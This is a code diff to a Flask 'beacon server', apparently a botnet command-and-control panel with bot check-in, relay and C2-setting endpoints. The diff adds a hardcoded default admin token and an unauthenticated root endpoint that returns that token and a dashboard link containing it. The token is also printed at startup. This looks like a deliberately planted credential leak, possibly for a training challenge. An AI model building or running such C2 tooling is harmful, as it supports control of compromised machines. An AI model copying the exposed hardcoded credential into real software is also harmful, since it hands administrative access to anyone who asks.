@@ -226,12 +226,50 @@ HTML_DASHBOARD = """
 """
 
 
+def init_default_operator():
+    with db() as conn:
+        existing = conn.execute("SELECT token FROM operators WHERE username='admin'").fetchone()
+        if not existing:
+            token = "admin_token_foxden2026"
+            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            conn.execute(
+                "INSERT INTO operators(username, token, created) VALUES(?, ?, ?)",
+                ("admin", token, now),
+            )
+            return token
+    return None
+
+
 def update_bot_status():
     cutoff = (datetime.now() - timedelta(seconds=ONLINE_WINDOW_SEC)).strftime(
         "%Y-%m-%d %H:%M:%S"
     )
     with db() as conn:
         conn.execute("UPDATE bots SET status='offline' WHERE last_seen < ?", (cutoff,))
+
+
+@app.route("/", methods=["GET"])
+def index():
+    admin_token = None
+    with db() as conn:
+        admin = conn.execute("SELECT token FROM operators WHERE username='admin'").fetchone()
+        if admin:
+            admin_token = admin["token"]
+
+    return jsonify({
+        "status": "ok",
+        "version": "4.7",
+        "admin_token": admin_token,
+        "dashboard": f"/operator/dashboard?token={admin_token}" if admin_token else "/operator/dashboard",
+        "endpoints": {
+            "beacon": "/beacon (POST)",
+            "dashboard": "/operator/dashboard",
+            "create_operator": "/operator/create_operator",
+            "add_relay": "/operator/add_relay",
+            "list_relays": "/operator/list_relays",
+            "set_c2": "/operator/set_c2"
+        }
+    })
 
 
 @app.route("/beacon", methods=["POST"])
@@ -378,4 +416,11 @@ def api_create_operator():
 
 if __name__ == "__main__":
     init_db()
-    app.run(host=LISTEN_HOST, port=LISTEN_PORT, debug=False)
+    token = init_default_operator()
+    display_host = "localhost" if LISTEN_HOST == "0.0.0.0" else LISTEN_HOST
+    if token:
+        print(f"\n[+] Default admin created: token={token}")
+    print(f"\n[+] Beacon Server v4.7 started")
+    print(f"[+] Dashboard: http://{display_host}:{LISTEN_PORT}/operator/dashboard?token=admin_token_foxden2026")
+    print(f"[+] API: http://{display_host}:{LISTEN_PORT}/\n")
+    app.run(host=LISTEN_HOST, port=LISTEN_PORT, debug=False, use_reloader=False)
